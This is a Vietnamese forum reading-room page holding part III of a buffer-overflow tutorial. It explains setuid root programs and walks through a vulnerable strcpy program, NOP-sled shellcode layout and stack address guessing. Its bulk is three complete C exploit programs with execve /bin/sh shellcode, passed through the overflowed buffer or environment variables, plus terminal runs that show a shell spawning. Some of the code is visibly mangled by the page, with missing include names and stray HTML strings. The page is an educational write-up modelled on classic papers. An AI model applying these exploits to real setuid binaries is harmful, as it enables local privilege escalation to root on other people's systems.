<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"> 

<html>
<head>
<meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
<meta name="description" content="HVA Reading Room">
<meta name="keywords" content=", reading room, hva, hvaonline, hvazone, hvaforum">
<meta name="resource-type" content="document">
<meta name="distribution" content="global">
<meta name="robots" content="index,follow">
<meta name="rating" content="general">
<style type="text/css">
<!-- 
@import url( "/hvaonline/templates/viet/styles/style.css");
-->
</style>
<style type="text/css">
<!--
@import url("/hvaonline/templates/viet/styles/en_US.css");
-->
</style>
<title> - .:: HVAOnline ::.</title>

</head>
<body class="en_US">


<!--
Original theme from phpBB (http://www.phpbb.com) subSilver
Created by subBlue design
http://www.subBlue.com
Modifications by JForum Team 
Extended and customised by HVA Team
Added more features and Black Silver theme designed by HVA
-->
<table width="100%" border="0" cols="2">
	<tr align="right">
		<td class="copyright">
			English
			| 
			<a href="/hvaonline/jforum.html?module=forums&amp;action=setLang&amp;lang=vi_VN" rel="nofollow">Vietnamese</a>
		</td>
	</tr>
</table>
<table width="100%" border="0" align="center">
	<tr>
        <td width="100%" align="center" valign="middle">
			<a href="" title="[Logo]"><img src="/hvaonline/templates/viet/images/hvabanner-final.gif" alt="banner" /></a>
		</td>
	</tr>

	<tr>
		<td>
<table cellspacing="0" cellpadding="0" width="80%" align="center" border="0">

		<tr height="15">
			<th colspan="2" class="thportal" align="left"><span class="readingheader">&nbsp;.::Exploit::.</span></th>
		    <th class="thportal" align="center">
				<span class="readingheader">
					 Tìm hiểu đầy đủ về tràn bộ đệm - III <a name="topPage" id="topPage"></a>
				</span>
			</th>
		    <th class="thportal" align="right">
				<a href="/hvaonline/posts/list/0/430.html#1113" target="_blank">
				<img src="/hvaonline/templates/viet/images/goright.gif" align="absbottom" border="0" alt="Go to original post" title="Go to original post"/></a> 
				<img src="/hvaonline/templates/viet/images/what.gif" align="absbottom" border="0" alt="Author: dientinh  - Translator:  - Entry Date: 19/02/2009 13:29:58" title="Author: dientinh  - Translator:  - Entry Date: 19/02/2009 13:29:58"/>
			</th>
		</tr>
</table>

<table cellspacing="0" cellpadding="5" width="80%" align="center" border="0">
		<tr>
		    <td align="left" colspan="2" class="readingborderBottom">
				<table cellspacing="0" cellpadding="10" width="95%" align="center" border="0">
					<tr>
						<td align="left">
							<div class="postbody">Tác giả: dientinh<br/> <br/> <b><font color='yellow'>Khai thác lỗi tràn bộ đệm</font></b><br/> <br/> <font color='yellow'>1. Quyền root và chương trình setuid/setgid</font><br/> Trên các hệ điều hành đa người dùng nói chung và UNIX nói riêng, thiết kế truyền thống cho phép user root (superuser) có quyền tối cao có thể thực hiện mọi thao tác trên hệ thống. Hơn nữa, có một số thao tác đòi hỏi buộc phải có quyền root mới có thể thực hiện được, ví dụ thay đổi mật khẩu (phải cập nhật file /etc/passwd). Để người dùng bình thường có thể thực hiện được các thao tác này, hệ thống UNIX cung cấp một cơ chế thiết lập quyền thực tế của tiến trình đang thực thi thông qua các hàm thiết lập quyền như setuid()/setgid(), seteuid()/setegid(), setruid()/setrgid(). Quyền thực tế sẽ được hệ thống tự động thiết lập thông qua bit thuộc tính suid/sgid của file chương trình. Ví dụ chương trình passwd được suid root:<br/> <br/> -r-s--x--x 1 root root 12244 Feb 8 2000 /usr/bin/passwd<br/> <br/> Khi user bình thường thực thi chương trình, quyền thực tế có được sẽ là quyền của người sở hữu (owner) file, ở đây là root. Do yêu cầu sử dụng, trên hệ thống UNIX thường có nhiều file chương trình được thiết lập thuộc tính suid (cho owner, group). Ví dụ sau sẽ minh hoạ rõ hơn điều này:<br/> <br/> /* suidsh.c */<br/> void main() {<br/> setuid(0);<br/> system("/bin/sh");<br/> }<br/> <br/> [SkZ0@gamma bof]$ gcc -o suidsh suidsh.c<br/> [SkZ0@gamma bof]$ su<br/> Password: <br/> # chown root.root suidsh<br/> # chmod 4755 suidsh<br/> # exit<br/> [SkZ0@gamma bof]$ ls -l suidsh<br/> -rwsr-xr-x 1 root root 13637 Mar 26 15:54 suidsh<br/> [SkZ0@gamma bof]$ id<br/> uid=501(SkZ0) gid=501(SkZ0) groups=501(SkZ0)<br/> [SkZ0@gamma bof]$ ./suidsh<br/> bash# id<br/> uid=0(root) gid=501(SkZ0) groups=501(SkZ0)<br/> <br/> Có thể thấy, nếu chương trình suid/sgid bị lỗi bảo mật, hacker sẽ tận dụng điều này để điều khiển chương trình thực hiện mã lệnh bất kỳ trên hệ thống với quyền cao hơn và thậm chí với quyền cao nhất root. Đó chính là mục đích của việc khai thác các lỗ hổng bảo mật trên máy tại chỗ (local).<br/> <br/> <font color='yellow'>2. Chương trình bị tràn bộ đệm</font><br/> Để minh hoạ cách tổ chức và chèn shellcode vào chương trình bị lỗi, ta sẽ sửa lại một chút chương trình vuln.c đã ví dụ ở phần 1:<br/> <br/> /* vuln1.c */<br/> int main(int argc, char **argv)<br/> {<br/> char buf[500];<br/> if (argc&gt;1) {<br/> strcpy(buf, argv[1]);<br/> printf("%s\n", buf);<br/> }<br/> }<br/> <br/> Kích thước của bộ đệm buf là 500 byte. Từ những trình bày ở phần trước, để khai thác lỗi tràn bộ đệm trong chương trình vuln1.c chúng ta chỉ cần ghi đè giá trị của "con trỏ lệnh bảo lưu" (saved instruction pointer) được lưu trên stack bằng địa chỉ mã lệnh mong muốn, ở đây chính là địa chỉ bắt đầu của shellcode. Như vậy chúng ta cần phải sắp xếp shellcode ở đâu đó trên bộ nhớ stack và xác định địa chỉ bắt đầu của nó.<br/> <br/> <br/> <font color='yellow'>3. Tổ chức shellcode trên bộ nhớ</font><br/> Vấn đề của việc tổ chức shellcode trên bộ nhớ là làm thế nào để chương trình khai thác lỗi có thể xác định được địa chỉ bắt đầu của bộ đệm chứa shellcode bên trong chương trình bị lỗi. Thông thường, ta không thể biết một cách chính xác địa chỉ của bộ đệm trong chương trình bị lỗi (phụ thuộc vào biến môi trường, tham số khi thực thi), do đó ta sẽ xác định một cách gần đúng. Điều này có nghĩa chúng ta phải tổ chức bộ đệm chứa shellcode sao cho khi bắt đầu ở một địa chỉ có thể lệch so với địa chỉ chính xác mà shellcode vẫn thực thi không hề bị ảnh hưởng. Lệnh máy NOP (No OPeration) giúp ta đạt được điều này. Khi gặp một lệnh NOP, CPU sẽ không làm gì cả ngoài việc tăng con trỏ lệnh đến lệnh kế tiếp.<br/> <br/> Như vậy, chúng ta sẽ lấp đầy phần đầu của bộ đệm bằng các lệnh NOP, kế đó là shellcode. Hơn nữa, để không phải tính toán chính xác vị trí lưu con trỏ lệnh bảo lưu trên stack, chúng ta sẽ chỉ đặt shellcode ở khoảng giữa của bộ đệm, phần còn lại sẽ chứa toàn các giá trị địa chỉ bắt đầu của shellcode. Cuối cùng, bộ đệm chứa shellcode sẽ có dạng:<br/> <br/> Hình 1: Tổ chức shellcode trên bộ nhớ <br/> <br/> Hình sau mô tả trạng thái của stack trước và sau khi tràn bộ đệm xảy ra.<br/> <br/> Hình 2: Trạng thái stack trước và sau khi tràn bộ đệm <br/> Before After <br/> <br/> Có một vấn đề cũng cấn lưu ý ở đây là sự sắp xếp (alignment) biến trên stack. Giá trị địa chỉ có độ dài 4 byte (32 bit), vì vậy khi được sắp vào stack không phải lúc nào cũng chính xác như mong muốn. Ở phần trước chúng ta đã biết stack sử dụng đơn vị là word có độ dài 4 byte, do đó độ lệch do sắp không đúng sẽ là 1, 2 hoặc 3 byte.<br/> <br/> Hình 3: Các khả năng sắp xếp biến trên stack <br/> <br/> Chỉ có một trường hợp sắp xếp đúng sẽ làm việc, các trường hợp khác sẽ dẫn đến báo lỗi "segmentation violation" hoặc "illegal instruction", tuy nhiên chúng ta có thể sử dụng phương pháp "thử và sai" để tìm được sự sắp xếp đúng trong bộ nhớ không mấy khó khăn.<br/> <br/> <br/> <font color='yellow'>4. Xác định địa chỉ shellcode</font><br/> Vấn đề quan trọng nhất là làm thế nào để "đoán trước" được địa chỉ bắt đầu của bộ đệm chứa shellcode bên trong chương trình bị lỗi. Nhờ cách tổ chức shellcode với các NOP ở trên, địa chỉ này chỉ cần gần đúng sao cho rơi vào khoảng giữa các lệnh NOP trên bộ đệm shellcode.<br/> <br/> Một điểm đặc biệt là mọi chương trình khi thực thi đều có địa chỉ bắt đầu stack như nhau (lưu ý: trên không gian địa chỉ ảo. Ví dụ: giá trị này trên Linux là 0xbfffffff, trên FreeBSD là 0xbfbfffff) và thường các chương trình ít khi push vào stack ngay một lúc vài ngàn byte. Do đó, ta có thể đoán được địa chỉ bắt đầu của bộ đệm chứa shellcode trên stack trong chương trình bị lỗi dựa vào độ lệch so với địa chỉ đỉnh stack hiện tại của chương trình khai thác lỗi. Độ lệch này có thể mang giá trị âm hoặc giá trị dương (xem lại phần 1).<br/> <br/> Đoạn chương trình sau sẽ in ra giá trị của con trỏ stack SP:<br/> <br/> /* sp.c */<br/> unsigned long get_sp(void) {<br/> __asm__("movl %esp,%eax");<br/> }<br/> <br/> void main() {<br/> printf("0x%x\n", get_sp());<br/> }<br/> <br/> [SkZ0@gamma bof]$ gcc -o sp sp.c<br/> [SkZ0@gamma bof]$ ./sp<br/> 0xbffffa50<br/> [SkZ0@gamma bof]$<br/> <br/> Địa chỉ gần đúng của bộ đệm chứa shellcode sẽ được xác định theo công thức:<br/> <br/> SP +(-) OFFSET<br/> <br/> <br/> <font color='yellow'>5. Viết chương trình khai thác lỗi tràn bộ đệm</font><br/> Chúng ta đã biết những gì cần thiết để khai thác lỗi tràn bộ đệm, bây giờ cần phải kết hợp lại. Các bước cơ bản của kỹ thuật tràn bộ đệm là: chuẩn bị bộ đệm dùng để làm tràn (như ở phần trên), xác định địa chỉ trả về (RET) và độ lệch do sắp biến, xác định địa chỉ của bộ đệm chứa shellcode, cuối cùng gọi thực thi chương trình bị tràn bộ đệm.<br/> <br/> Có một số cách để tổ chức shellcode trên bộ nhớ và truyền cho chương trình bị lỗi, trước tiên chúng ta sẽ xem xét phương pháp cơ bản nhất: shellcode được truyền thông qua bộ đệm của chương trình bị lỗi. Phương pháp này không phải là cách dễ dàng nhất để khai thác lỗi tràn bộ đệm trên máy tại chỗ (local) nhưng đây là cách tổng quát nhất để khai thác lỗi tràn bộ đệm tại chỗ cũng như từ xa.<br/> <br/> <br/> Xem trong ví dụ trên, shellcode sẽ được tổ chức và truyền qua bộ đệm buf của chương trình vuln1.c<br/> <br/> <font color='yellow'>5.1. Truyền shellcode qua bộ đệm</font><br/> Chương trình khai thác lỗi tràn bộ đệm sau của chúng ta sẽ nhận 3 giá trị tham số: tên chương trình bị lỗi, kích thước bộ đệm dùng để làm tràn và giá trị độ dời so với con trỏ stack hiện tại (ví trị dự đoán của bộ đệm chứa shellcode).<br/> <br/> /* exploit1.c */<br/> #include <br/> <br/> #define DEFAULT_OFFSET 0<br/> #define DEFAULT_BUFFER_SIZE 512<br/> #define NOP 0x90 // mã asm của lệnh NOP<br/> <br/> char shellcode[] =<br/> "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50"<br/> "\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xb\x31\xc0\x40\xcd\x80";<br/> <br/> unsigned long get_sp(void) {<br/> __asm__("movl %esp,%eax");<br/> }<br/> <br/> void main(int argc, char *argv[]) {<br/> char *buff, *ptr;<br/> long *addr_ptr, addr;<br/> int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;<br/> int i;<br/> <br/> if (argc &lt; 2) {<br/> printf("Usage: %s target [bsize offset]\n", argv[0]); <br/> exit(0);<br/> }<br/> <br/> if (argc &gt; 2) bsize = atoi(argv[2]); <br/> if (argc &gt; 3) offset = atoi(argv[3]); <br/> <br/> if (!(buff = malloc(bsize))) {<br/> printf("Can't allocate memory.\n");<br/> exit(0);<br/> }<br/> <br/> addr = get_sp() - offset;<br/> printf("Using address: 0x%x\n", addr);<br/> <br/> ptr = buff;<br/> /* lấp đầy bộ đệm làm tràn với các địa chỉ của shellcode */<br/> addr_ptr = (long *) ptr;<br/> for (i = 0; i &lt; bsize; i+=4)<br/> *(addr_ptr++) = addr;<br/> <br/> /* lấp đầy nửa đầu vói các lệnh NOP */<br/> for (i = 0; i &lt; bsize/2; i++)<br/> buff[i] = NOP;<br/> <br/> /* tiếp theo là shellcode */ <br/> ptr = buff + ((bsize/2) - (strlen(shellcode)/2));<br/> for (i = 0; i &lt; strlen(shellcode); i++)<br/> *(ptr++) = shellcode[i];<br/> <br/> buff[bsize - 1] = '&lt;!--POST BOX--&gt;';<br/> <br/> execl(argv[1],argv[1],buff,NULL);<br/> }<br/> <br/> <br/> Chương trình trên cấp phát bộ đệm dùng để làm tràn trên heap, lý do tại sao xin dành cho người đọc tự trả lời.<br/> <br/> Kích thước của bộ đệm dùng làm tràn lớn hơn so với bộ đệm bị tràn khoảng 100 byte là tốt nhất. Khi đó bộ đệm làm tràn có phần đầu khá lớn chứa các NOP, phần cuối chứa shellcode và địa chỉ đủ để làm tràn và ghi đè lên giá trị địa chỉ trả về (RET).<br/> <br/> Hãy thử chương trình khai thác lỗi vừa viết.<br/> <br/> [SkZ0@gamma bof]$ ./exploit1 ./vuln1 600<br/> Using address: 0xbffffa1c<br/> <br/> ( ... )<br/> <br/> bash$ <br/> <br/> Thử với giá trị độ dời:<br/> <br/> [SkZ0@gamma bof]$ ./exploit1 ./vuln1 600 100<br/> Using address: 0xbffff9a8<br/> <br/> ( ... )<br/> <br/> [SkZ0@gamma bof]$ ./exploit1 ./vuln1 600 -100<br/> Using address: 0xbffffa70<br/> <br/> ( ... )<br/> <br/> bash$ <br/> <br/> <font color='yellow'>5.2. Truyền shellcode qua biến môi trường</font><br/> Bây giờ, hãy quay trở lại với ví dụ đầu tiên, chương trình vuln.c (xem phần 1). Có thể thấy chương trình exploit1.c không thể khai thác được lỗi tràn bộ đệm trong vuln.c do kích thước bộ đệm bị tràn quá nhỏ (16 byte) không đủ để đặt vừa shellcode. Khi đó địa chỉ trả về sẽ bị ghi đè bởi các mã lệnh thay vì giá trị địa chỉ cần nhảy đến. Để vượt qua trở ngại này, chúng ta sẽ dùng một "bộ đệm" khác để lưu trữ shellcode. Thông thường có thể dùng biến môi trường (environment) hoặc một tham số dòng lệnh chương trình (argument) để chứa shellcode do các biến này đều được cấp trên stack, tuy nhiên sử dụng biến môi trường là phương pháp đơn giản và hiệu quả hơn. Với shellcode được chứa trong biến môi trường, bộ đệm dùng để làm tràn chỉ đơn giản chứa toàn giá trị địa chỉ (phỏng đoán) của biến môi trường chứa shellcode.<br/> <br/> Chương trình exploit1.c được sửa lại như sau (có thêm một tham số là kích thước của bộ đệm chứa shellcode). <br/> <br/> /* exploit2.c */<br/> #include <br/> <br/> #define DEFAULT_OFFSET 0<br/> #define DEFAULT_BUFFER_SIZE 512<br/> #define DEFAULT_EGG_SIZE 2048<br/> #define NOP 0x90 // mã asm của lệnh NOP<br/> <br/> char shellcode[] =<br/> "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50"<br/> "\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xb\x31\xc0\x40\xcd\x80";<br/> <br/> unsigned long get_esp(void) {<br/> __asm__("movl %esp,%eax");<br/> }<br/> <br/> void main(int argc, char *argv[]) {<br/> char *buff, *ptr, *egg;<br/> long *addr_ptr, addr;<br/> int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;<br/> int i, eggsize=DEFAULT_EGG_SIZE;<br/> <br/> if (argc &lt; 2) {<br/> printf("Usage: %s target [bsize offset eggsize]\n", argv[0]); <br/> exit(0);<br/> }<br/> <br/> if (argc &gt; 2) bsize = atoi(argv[2]);<br/> if (argc &gt; 3) offset = atoi(argv[3]);<br/> if (argc &gt; 4) eggsize = atoi(argv[4]);<br/> <br/> if (!(buff = malloc(bsize))) {<br/> printf("Can't allocate memory.\n");<br/> exit(0);<br/> }<br/> if (!(egg = malloc(eggsize))) {<br/> printf("Can't allocate memory.\n");<br/> exit(0);<br/> }<br/> <br/> addr = get_esp() - offset;<br/> printf("Using address: 0x%x\n", addr);<br/> <br/> /* bộ đệm làm tràn chỉ chứa toàn địa chỉ shellcode */ <br/> ptr = buff;<br/> addr_ptr = (long *) ptr;<br/> for (i = 0; i &lt; bsize; i+=4)<br/> *(addr_ptr++) = addr;<br/> <br/> /* NOP+shellcode được đặt trong biến môi trường */<br/> ptr = egg;<br/> for (i = 0; i &lt; eggsize - strlen(shellcode) - 1; i++)<br/> *(ptr++) = NOP;<br/> <br/> for (i = 0; i &lt; strlen(shellcode); i++)<br/> *(ptr++) = shellcode[i];<br/> <br/> buff[bsize - 1] = '&lt;!--POST BOX--&gt;';<br/> egg[eggsize - 1] = '&lt;!--POST BOX--&gt;';<br/> <br/> setenv("EGG", egg, 1);<br/> execl(argv[1],argv[1],buff,NULL);<br/> }<br/> <br/> Hãy thử chương trình khai thác lỗi mới:<br/> <br/> [SkZ0@gamma bof]$ ./exploit2 ./vuln<br/> Using address: 0xbffffa18<br/> <br/> ( ... )<br/> <br/> bash$ <br/> <br/> Có thể thấy cách sử dụng biến môi trường khá hiệu quả. Phương pháp sau (chỉ áp dụng cho Linux x86) cũng sử dụng biến môi trường để chứa shellcode nhưng xác định được chính xác địa chỉ của biến môi trường này. Do đó, ta không cần phải lấp đầy các NOP vào đầu bộ đệm chứa shellcode, cũng như địa chỉ shellcode được xác định chính xác thay vì phải phỏng đoán.<br/> <br/> Phần địa chỉ cao nhất (tương đương phần đáy của stack) của một file chương trình ELF, Linux x86 có dạng:<br/> <br/> Hình 4: Cấu trúc đáy stack của Linux x86 <br/> <br/> Ta thấy, địa chỉ biến môi trường cuối cùng được tính theo công thức sau:<br/> <br/> <br/> envpn = 0xBFFFFFFF -<br/> 4 - // 4 NULL bytes<br/> strlen(program_name) - // chiều dài chuỗi tên chương trình<br/> 1 - // giá trị null của chuỗi tên chương trình <br/> strlen(envp[n])) // độ dài của biến môi trường cuối cùng<br/> <br/> hay rút gọn:<br/> envpn = 0xBFFFFFFA - strlen(prog_name) - strlen(envp[n])<br/> <br/> Các hàm gọi thực thi chương trình như execle, execve cho phép truyền con trỏ biến môi trường cho chương trình được gọi. Tận dụng điều này chúng ta có thể truyền trực tiếp bộ đệm chứa shellcode cho chương trình bị lỗi thông qua con trỏ biến môi trường, và tính được chính xác địa chỉ của nó.<br/> <br/> Công thức để tính đia chỉ của shellcode:<br/> <br/> addr = 0xBFFFFFFA - strlen(prog_name) - strlen(shellcode);<br/> <br/> Chương trình khai thác lỗi mới được viết như sau:<br/> <br/> /* exploit3.c */<br/> #include <br/> <br/> #define DEFAULT_BUFFER_SIZE 512<br/> #define NOP 0x90 // mã asm của lệnh NOP<br/> <br/> char shellcode[] =<br/> "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50"<br/> "\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xb\x31\xc0\x40\xcd\x80";<br/> <br/> void main(int argc, char *argv[]) {<br/> char *buff, *ptr, *egg;<br/> long *addr_ptr, addr;<br/> int bsize=DEFAULT_BUFFER_SIZE;<br/> int i;<br/> <br/> char *env[2] = {shellcode, NULL};<br/> <br/> if (argc &lt; 2) {<br/> printf("Usage: %s target [bsize]\n", argv[0]); <br/> exit(0);<br/> }<br/> <br/> if (argc &gt; 2) bsize = atoi(argv[2]);<br/> <br/> if (!(buff = malloc(bsize))) {<br/> printf("Can't allocate memory.\n");<br/> exit(0);<br/> }<br/> <br/> addr = 0xbffffffa - strlen(shellcode) - strlen(argv[1]);<br/> printf("Using address: 0x%x\n", addr);<br/> <br/> /* bộ đệm làm tràn chỉ chứa toàn địa chỉ shellcode */ <br/> ptr = buff;<br/> addr_ptr = (long *) ptr;<br/> for (i = 0; i &lt; bsize; i+=4)<br/> *(addr_ptr++) = addr;<br/> buff[bsize - 1] = '&lt;!--POST BOX--&gt;';<br/> <br/> execle(argv[1],argv[1],buff,NULL,env);<br/> }<br/> <br/> Trong chương trình trên, chúng ta đã truyền cho chương trình bị lỗi con trỏ biến môi trường chỉ với một biến duy nhất là bộ đệm chứa shellcode, do đó độ dài của biến môi trường chính là độ dài của shellcode. Thử chương trình khai thác lỗi mới này:<br/> <br/> [SkZ0@gamma bof]$ ./exploit3 ./vuln<br/> Using address: 0xbfffffd4<br/> <br/> ( ... )<br/> <br/> bash$ <br/> <br/> <br/> <font color='yellow'>6. Kết luận</font><br/> Hy vọng những gì đã trình bày có thể giúp các bạn hiểu được nguyên nhân và hậu quả dẫn đến của lỗi tràn bộ đệm. Kỹ thuật khai thác lỗi tràn bộ đệm là hoàn toàn không khó khi đã có cơ sở lý thuyết hết sức rõ ràng, mặc dù nó đòi hỏi phải có hiểu biết chút ít về ngôn ngữ lập trình. Việc tránh lỗi bộ đệm xảy ra cũng có thể đạt được không mấy khó khăn, đó là thực hiện nguyên tắc: tạo các chương trình an toàn ngay từ khi thiết kế.<br/> <br/> <br/> <br/> Tài liệu tham khảo<br/> Smashing The Stack For Fun And Profit - Aleph1 <br/> Avoiding security holes when developing an application - Frédéric Raynal, Christophe Blaess, Christophe Grenier <br/> BUFFER OVERFLOWS DEMYSTIFIED - Murat Balaban <br/> Writing buffer overflow exploits - a tutorial for beginners - Mixter <br/> <br/> <br/> Liên kết<br/><span class="link"><span class="link"><span class="link"><span class="link"><span class="link"><span class="link"><span class="link"><span class="link"><span class="link"><span class="link"><span class="link"><span class="link"><span class="link"> http://www.phrack.org/</span></span></span></span></span></span></span></span></span></span></span></span></span> <br/><span class="link"><span class="link"><span class="link"><span class="link"><span class="link"><span class="link"><span class="link"><span class="link"><span class="link"><span class="link"><span class="link"><span class="link"><span class="link"> http://community.core-sdi.com/~juliano/</span></span></span></span></span></span></span></span></span></span></span></span></span> </div>
						</td>
					</tr>

					<tr>
						<td align="left"><a href="http://digg.com/submit?phrase=2&url=/hvaonline/readingRoom/item/1113.html"><img src="/hvaonline/templates/viet/images/digg.gif" align="texttop" alt="[digg]" title="[digg]"></a>
<a href="http://del.icio.us/post?url=/hvaonline/readingRoom/item/1113.html"><img src="/hvaonline/templates/viet/images/delicious.gif" align="texttop" alt="[delicious]" title="[delicious]"></a>
<a href="http://www.google.com/bookmarks/mark?op=edit&output=popup&bkmk=/hvaonline/readingRoom/item/1113.html"><img src="/hvaonline/templates/viet/images/google.gif" align="texttop" alt="[google]" title="[google]"></a>
<a href="http://bookmarks.yahoo.com/toolbar/savebm?opener=tb&u=/hvaonline/readingRoom/item/1113.html"><img src="/hvaonline/templates/viet/images/yahoo.gif" align="texttop" alt="[yahoo]" title="[yahoo]"></a>
<a href="http://technorati.com/faves?add=/hvaonline/readingRoom/item/1113.html"><img src="/hvaonline/templates/viet/images/technorati.gif" align="texttop" alt="[technorati]" title="[technorati]"></a>
<a href="http://reddit.com/submit?url=/hvaonline/readingRoom/item/1113.html"><img src="/hvaonline/templates/viet/images/reddit.gif" align="texttop" alt="[reddit]" title="[reddit]"></a>
<a href="http://www.stumbleupon.com/submit?url=/hvaonline/readingRoom/item/1113.html"><img src="/hvaonline/templates/viet/images/stumbleupon.gif" align="texttop" alt="[stumbleupon]" title="[stumbleupon]"></a></td>
					</tr>
				</table>
			</td>
		</tr>

		<tr>
			<td align="left" colspan="2" class="readingborderBottom">
				<table cellspacing="0" cellpadding="10" width="95%" align="center" border="0">
					<tr>
						<td align="left">
						<div class="postbody"><b>Other posts in the same group:</b></div><br />
									<div class="gen"><a href="/hvaonline/readingRoom/item/1087.html">Tìm hiểu đầy đủ về tràn bộ đệm</a></div>
									<div class="gen"><a href="/hvaonline/readingRoom/item/1107.html">Tìm hiểu đầy đủ về tràn bộ đệm - II</a></div>
									<div class="gen"><b>Tìm hiểu đầy đủ về tràn bộ đệm - III</b></div>
						</td>
					</tr>
				</table>
			</td>
		</tr>


		<tr>
			<td align="left" valign="top">
				<a href="#topPage"><img src="/hvaonline/templates/viet/images/goup.gif" align="absbottom" border="0" alt="Go to top" title="Go to top"></a>
				<a href="/hvaonline/posts/list/0/430.html#1113" target="_blank"><img src="/hvaonline/templates/viet/images/goright.gif" border="0" align="absbottom" alt="Go to original post" title="Go to original post"></a> 
				&nbsp;
			</td>
			<td align="right">	<table cellspacing="0" cellpadding="0" border="0">
		<tr>			  
			<td nowrap="nowrap">
				<form action="" name="f" id="f" accept-charset="UTF-8">
					<select onchange="if(this.options[this.selectedIndex].value > 0){ document.location = '/hvaonline/readingRoom/show/'+ this.options[this.selectedIndex].value +'.html'; }" name="select">
						<option value="0" selected="selected">Go to Category</option>	
						<option value="0">------------------------</option>	
								<option value="1">Defense</option>
								<option value="2">Exploit</option>
								<option value="3">Reverse Engineering</option>
								<option value="4">*nix</option>
								<option value="5">Windows</option>
								<option value="6">Networking</option>
								<option value="7">Others</option>
					</select>
				</form>
			</td>
		</tr>
	</table>
</td>
		</tr>
</table>
<script type="text/javascript">
		var ctlTop = false;
		var ctlBt = false;

		function activateControllerTop()
		{
			ctlTop = !ctlTop;
			document.getElementById("controllerTop").style.display = (ctlTop ? "" : "none");
			document.getElementById("controllerTop").style.display = (ctlTop ? "" : "none");
			document.getElementById("controllerTop").style.display = (ctlTop ? "" : "none");

			if (ctlTop) {
				document.location = document.location + "#ctlTop";
			}
		}

		function activateControllerBottom()
		{
			ctlBt = !ctlBt;
			document.getElementById("controllerBottom").style.display = (ctlBt ? "" : "none");
			document.getElementById("controllerBottom").style.display = (ctlBt ? "" : "none");
			document.getElementById("controllerBottom").style.display = (ctlBt ? "" : "none");

			if (ctlBt) {
				document.location = document.location + "#ctlBt";
			}
		}
</script>

	<tr>	
		<td align="center">
		<br>
					</td>
	</tr>

	<tr>
		<td align="center">
			<span class="copyright">Powered by JForum - Extended by <a href="MailTo:lienlac@hvaonline.net">HVAOnline</a><br>
			&nbsp;hvaonline.net&nbsp; | &nbsp;hvaforum.net&nbsp; | &nbsp;hvazone.net&nbsp; | &nbsp;hvanews.net&nbsp; | &nbsp;vnhacker.org<br>
			1999 - 2013 &copy;
			v2012|0504|218|
		  </span>
	  </td>
	</tr>
<iframe src="/hvaonline/templates/ping_session.html" height="0" width="0" frameborder="0" scrolling="no"></iframe>
</body>
</html>
